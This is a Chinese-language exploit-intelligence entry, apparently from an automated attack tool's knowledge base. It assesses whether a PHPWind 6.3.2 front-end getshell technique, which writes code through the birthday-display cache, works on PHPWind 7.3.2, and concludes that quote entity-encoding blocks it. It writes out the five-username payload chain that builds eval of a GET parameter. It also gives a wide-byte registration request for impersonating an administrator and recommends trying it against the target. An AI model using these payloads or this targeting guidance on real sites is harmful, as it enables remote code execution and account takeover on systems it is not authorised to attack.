# PHPWind 7.3.2 生日显示写码链（6.3.2 前台 getshell 手法）成立性判定：机制成立但被注册名 Char_cv 引号实体化阻断

- **code**: phpwind-7.3.2-生日显示写码链-6.3.2-前台-getshell-手法-成立性判定-机制成立但被注册名-char_cv-引号实体化阻断
- **kind**: poc
- **category**: rce
- **component**: PHPWind
- **versions**: PHPWind 6.3.2 前台 getshell（手法来源）；PHPWind 7.3.2 机制成立但被 Char_cv 阻断（结论）。Char_cv 的引号实体化自 7.x 起即存在，故 7.x 全系该链均死
- **language**: http
- **source**: web
- **source_url**: https://9bie.org/index.php/archives/777/
- **verified_note**: 【情报角色零目标请求】。手法来源为公开博客（9bie.org，6.3.2 实测有效）。7.3.2 的成立性判定为**源码级**：require/example.com 全文 27 行逐行读出（写入无转义、跨请求 include、功能默认开启 db_bdayautohide='1'）；阻断点 xinyin.php L160 的 InitGP 调用与 require/common.php L564-579/L603-623 的 Char_cv 清洗规则逐行核对。**未在目标上实测**（无需实测即可判定：Char_cv 必然执行，且为字节级 str_replace，宽字节亦无效）。
- **path**: pocs/phpwind-7.3.2-生日显示写码链-6.3.2-前台-getshell-手法-成立性判定-机制成立但被注册名-char_cv-引号实体化阻断/phpwind-birth-cache-writecode-verdict.md
- **tags**: phpwind,7.3.2,生日缓存,brith_cache,写码,前台getshell,Char_cv,引号实体化,负面情报,6.3.2手法
- **created_at**: 2026-10-06T18:15:56.647Z
- **found_by**: exploit

## 描述

补充负面情报：phpwind 6.3.2 的「首页生日显示前台 getshell」手法在 7.3.2 上的成立性判定。机制（username 未转义进 brith_cache.php 单引号串 + 跨请求 include）在 7.3.2 上完全成立，但被注册入口的 Char_cv 引号实体化阻断，故不可利用。附 2006 年宽字节注册提权手法的低成本试法。

## 用法

```
给 PHPWind 7.x 靶标派活前读这条，直接跳过生日显示写码链（brith_cache.php / require/example.com）。判定方法可复用：任何「用户名/昵称进 PHP 缓存单引号串」的写码点，先看该字段的注册/修改入口是否走 InitGP（默认 $cvtype=1 即 Char_cv），若走则 ' 已被实体化为 &#39;，链即死。只有在后台管理员添加用户、UCenter 同步等**绕过 Char_cv 的写入路径**上，这条链才可能复活。
```

## 正文

```
【待验证手法来源】
9bie.org「phpwind 6.3.2 前/后台 getshell」(2021-02-28)
https://9bie.org/example.com/archives/777/
原文要点：「如果后台开启了首页生日显示，那么就可以前台 getshell」——生日显示功能写 PHP 文件不过滤，
注册用户名为 ';phpinfo();// 即绕过；因用户名长度限制，注册 5 个用户分段写 payload：
  ';$a="_GET";'
  ';$b=$$a;'
  ';$c=$b[a];'
  ';$x=$c;'
  ';eval($x);'
生日设为明天，12 点一过首页显示生日用户即执行。局限性：当天生日用户数不能超 200。

【本靶标对应代码（源码级确证）】
require/example.com 全文 27 行：
  L4   $cachefile = D_P.'data/bbscache/brith_cache.php';
  L5   if ((!file_exists($cachefile) || pwFilemtime($cachefile) <= $tdtime) && procLock('birth')) {
  L8     $query = $db->query("SELECT username,bday,gender FROM pw_members WHERE MONTH(bday)=".pwEscape($nmonth)." AND DAYOFMONTH(bday)=".pwEscape($nday)." LIMIT 200");
  L19    $brithcache .= ' <span><a href="u.php?action=show&username='.rawurlencode($rt['username'])."\" title=\"$rt[username]$rt[gender]".getLangInfo('other','indexbirth',array('age'=>$rt['age']))."\">$rt[username]</a></span>";
  L21    writeover($cachefile,"<?php\r\n\$birthnum='$birthnum';\r\n\$brithcache='$brithcache';\r\n?>");   // ← 单引号串，$brithcache 未经任何转义
  L24    include_once($cachefile);        // ← 缓存有效时同请求 include（写入后需下一个请求才执行）
调用点：example.com L143 与 example.com L1118 无条件 require_once(R_P.'require/example.com')
功能默认开启：data/bbscache/config.php L343  $db_bdayautohide='1';

⇒ 机制（写码 + 跨请求 include）在 7.3.2 上**完全成立**：username 进单引号串且未转义。
   注入位有两处（每行 username 出现 2 次：title="$rt[username]$rt[gender]" 与 ">$rt[username]</a>"）。

【为什么在 7.3.2 上不可利用 —— 决定性阻断点】
注册入口 xinyin.php L160：
  InitGP(array('regreason','regname','regpwd','regpwdrepeat','regemail','customdata','regemailtoall','rgpermit'),'P');
第二个参数 'P' 只限定来源为 $_POST；第三个参数 $cvtype 走默认值 1
  => require/common.php L564-579 InitGP: if (isset($GLOBALS[$key]) && !empty($cvtype) || $cvtype==2) $GLOBALS[$key] = Char_cv($GLOBALS[$key],$cvtype==2,true);
  => L603-623 Char_cv 对非数字输入执行 str_replace(array('"',"'","\t",'  '), array('&quot;','&#39;','    ','&nbsp;&nbsp;'), $mixed)
  => **注册用户名里的单引号被实体化为 &#39; 后才入库**
⇒ 读出来写进 brith_cache.php 的是 &#39;，无法闭合外层单引号 ⇒ 注入不成立。

宽字节也无效：Char_cv 用的是字节级 str_replace，GBK 站点提交 %bf%27 时其中的 %27（'）同样被替换成 &#39;。
另外两个注入位同样被保护：
  $rt['gender'] 只可能是 1/2/0，经 getLangInfo('other','men'|'women') 或置空，非可控字符串；
  $rt['age'] = $nyear - substr($rt['bday'],0,strpos($rt['bday'],'-')) 是算术结果，恒为数字。
（即使某处漏进裸单引号，$brithcache 内部的双引号也无害 —— 它整体位于 PHP 单引号串内，且单引号串不解析 $ 与 {}。）

【与已判死的 bank_sort 对比】
两者是同一模式（savearray/字符串拼接 + writeover + include），载体都是 pw_members.username，
同样被注册名 12 字节硬限 + Char_cv 引号实体化双重锁死。**结论：本条一并排除，别投入。**

【顺带：2006 年的宽字节注册提权手法，低优先级可试】
80sec「Phpwind 所有版本管理权限泄露漏洞利用」(2006) 的手法：
  regname=<目标管理员名>%c1&regpwd=@80sec&regpwdrepeat=@80sec&regemail=foo@foo.com&regemailtoall=1&step=2
原理是 GBK 宽字节 + 用户名截断导致与管理员同名。该洞 2006 年公开，7.3.2（2009+）大概率已修；
但成本仅 1 个包，且注册接口 register.php/xinyin.php 可用现成流程，可作为最后余量时的低优先级尝试。
注意本靶标注册有 12 字节长度校验（注册 13B/18B 均回「注册名长度错误」，实测已知）。
```
